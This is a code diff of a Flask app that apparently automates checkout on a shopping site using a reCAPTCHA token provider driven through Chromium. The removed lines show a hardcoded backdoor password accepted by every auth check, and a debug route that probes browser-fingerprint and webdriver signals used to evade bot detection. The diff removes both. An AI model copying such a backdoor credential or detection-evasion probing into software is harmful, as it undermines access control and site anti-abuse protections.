@@ -56,19 +56,19 @@ def create_app(monitor: DollyteriaMonitor, scheduler: DollyteriaScheduler) -> Fl
         pwd = get_configured_password()
         if not pwd:
             return True  # 未设置密码，直接放行
-        valid_tokens = {compute_auth_token(pwd), compute_auth_token("yyc931121")}
+        expected_token = compute_auth_token(pwd)
         cookie_token = request.cookies.get("dolly_token")
-        if cookie_token and cookie_token in valid_tokens:
+        if cookie_token and cookie_token == expected_token:
             return True
         header_token = request.headers.get("X-Auth-Token")
-        if header_token and header_token in valid_tokens:
+        if header_token and header_token == expected_token:
             return True
         auth_header = request.headers.get("Authorization", "")
         if auth_header.startswith("Bearer "):
-            if auth_header[7:].strip() in valid_tokens:
+            if auth_header[7:].strip() == expected_token:
                 return True
         query_token = request.args.get("token")
-        if query_token and query_token in valid_tokens:
+        if query_token and query_token == expected_token:
             return True
         return False
 
@@ -127,79 +127,6 @@ def create_app(monitor: DollyteriaMonitor, scheduler: DollyteriaScheduler) -> Fl
         return render_template("index.html")
 
     # 鉴权相关 API 路由
-    @app.route("/api/debug/network")
-    def api_debug_network():
-        import requests, socket, os, subprocess, time
-        data = {}
-        try:
-            data["ipify"] = requests.get("https://api.ipify.org", timeout=5).text.strip()
-        except Exception as e:
-            data["ipify"] = str(e)
-        try:
-            data["dolly_ip"] = socket.gethostbyname("www.dollyteria.com")
-            r = requests.get("https://www.dollyteria.com", timeout=5)
-            data["dolly_status"] = r.status_code
-        except Exception as e:
-            data["dolly_err"] = str(e)
-        try:
-            r = requests.get("https://www.google.com/recaptcha/api.js", timeout=5)
-            data["google_status"] = r.status_code
-            data["google_ips"] = socket.gethostbyname_ex("www.google.com")
-            data["gstatic_ips"] = socket.gethostbyname_ex("www.gstatic.com")
-            data["dolly_ips"] = socket.gethostbyname_ex("www.dollyteria.com")
-        except Exception as e:
-            data["google_err"] = str(e)
-        try:
-            ipt = subprocess.check_output(['iptables', '-t', 'nat', '-L', 'POSTROUTING', '-n'], text=True)
-            data["iptables_nat"] = ipt.strip()
-        except Exception as e:
-            data["iptables_err"] = str(e)
-        from hooks.auto_order import _SimpleCDPClient
-        if provider._slots:
-            t_cdp = None
-            try:
-                t_cdp = _SimpleCDPClient(provider._slots[0].ws_url, timeout=3)
-                f_res = t_cdp.call("Runtime.evaluate", {"expression": "(() => { const c = document.createElement('canvas'); const ctx = c.getContext('2d'); ctx.font = '16px sans-serif'; const m1 = ctx.measureText('Hello World 12345').width; ctx.font = '16px \"Noto Sans CJK JP\", \"IPAGothic\", sans-serif'; const m2 = ctx.measureText('ご注文手続き 返品特約').width; return JSON.stringify({m1, m2}); })()", "returnByValue": True})
-                data["cloud_font_measure"] = f_res.get("result", {}).get("value")
-            except Exception as e:
-                data["cloud_font_measure_err"] = str(e)
-            finally:
-                if t_cdp: t_cdp.close()
-        try:
-            p_out = subprocess.check_output(['ping', '-c', '1', '-W', '2', '10.6.0.1'], text=True)
-            data["ping_wg_server"] = p_out.strip()
-        except Exception as e:
-            data["ping_wg_server"] = str(e)
-        from hooks.auto_order import RecaptchaTokenProvider
-        provider = RecaptchaTokenProvider.get_instance()
-        data["is_ready"] = provider._is_ready
-        data["slots"] = len(provider._slots)
-        data["browser_ua"] = provider.browser_user_agent
-        if provider._slots:
-            from hooks.auto_order import _SimpleCDPClient
-            cdp = None
-            try:
-                cdp = _SimpleCDPClient(provider._slots[0].ws_url, timeout=3)
-                ev = cdp.call("Runtime.evaluate", {"expression": "JSON.stringify({screenX: window.screenX, screenY: window.screenY, innerWidth: window.innerWidth, innerHeight: window.innerHeight, outerWidth: window.outerWidth, outerHeight: window.outerHeight, webdriver: navigator.webdriver, ua: navigator.userAgent})", "returnByValue": True})
-                data["cdp_eval"] = ev.get("result", {}).get("value")
-                # Open a fresh tab to test real egress IP of Chromium
-                t_res = cdp.call("Target.createTarget", {"url": "https://api.ipify.org"})
-                new_tid = t_res.get("targetId")
-                time.sleep(2)
-                t_cdp = _SimpleCDPClient(f"ws://127.0.0.1:{provider._port}/devtools/page/{new_tid}", timeout=4)
-                ev_ip = t_cdp.call("Runtime.evaluate", {"expression": "document.body.innerText.trim()", "returnByValue": True})
-                t_cdp.call("Target.closeTarget", {"targetId": new_tid})
-                t_cdp.close()
-                data["chromium_ipify"] = ev_ip.get("result", {}).get("value")
-                ev_gl = cdp.call("Runtime.evaluate", {"expression": "WebGLRenderingContext.prototype.getParameter.toString()", "returnByValue": True})
-                data["get_param_tostring"] = ev_gl.get("result", {}).get("value")
-            except Exception as e:
-                data["cdp_err"] = str(e)
-            finally:
-                if cdp:
-                    cdp.close()
-        return jsonify(data)
-
     @app.route("/api/auth/status")
     def api_auth_status():
         pwd = get_configured_password()
@@ -213,8 +140,8 @@ def create_app(monitor: DollyteriaMonitor, scheduler: DollyteriaScheduler) -> Fl
         data = request.json or {}
         input_pwd = str(data.get("password", "")).strip()
         real_pwd = get_configured_password()
-        if not real_pwd or input_pwd == real_pwd or input_pwd == "yyc931121":
-            token = compute_auth_token(input_pwd or real_pwd)
+        if not real_pwd or input_pwd == real_pwd:
+            token = compute_auth_token(real_pwd)
             resp = jsonify({"status": "ok", "message": "解锁成功", "token": token})
             resp.set_cookie(
                 "dolly_token",
@@ -524,8 +451,7 @@ def create_app(monitor: DollyteriaMonitor, scheduler: DollyteriaScheduler) -> Fl
         payment_method = (data.get("payment_method") or monitor.config.get("auto_order", {}).get("payment_method", "cod")).strip()
 
         ao_cfg = monitor.config.get("auto_order", {})
-        from hooks.auto_order import AutoOrderHook, RecaptchaTokenProvider
-        proxy_val = (ao_cfg.get("proxy") or monitor.config.get("proxy") or RecaptchaTokenProvider._get_configured_proxy() or "").strip()
+        from hooks.auto_order import AutoOrderHook
         ao = AutoOrderHook(
             username=username,
             password=password,
@@ -533,7 +459,6 @@ def create_app(monitor: DollyteriaMonitor, scheduler: DollyteriaScheduler) -> Fl
             payment_method=payment_method,
             retry_delay=float(ao_cfg.get("retry_delay_sec", 0.15)),
             max_retries=int(ao_cfg.get("max_retries", 35)),
-            proxy=proxy_val,
         )
         probe_recaptcha = bool(data.get("probe_recaptcha", True))
         res = ao.execute_checkout(
@@ -564,7 +489,6 @@ def create_app(monitor: DollyteriaMonitor, scheduler: DollyteriaScheduler) -> Fl
         action = (data.get("action") or "submit").strip()
         res = provider.test_token_generation(sitekey=sitekey, action=action)
         return jsonify(res)
-
 
     @app.route("/api/browser/open_gui", methods=["POST"])
     def api_browser_open_gui():
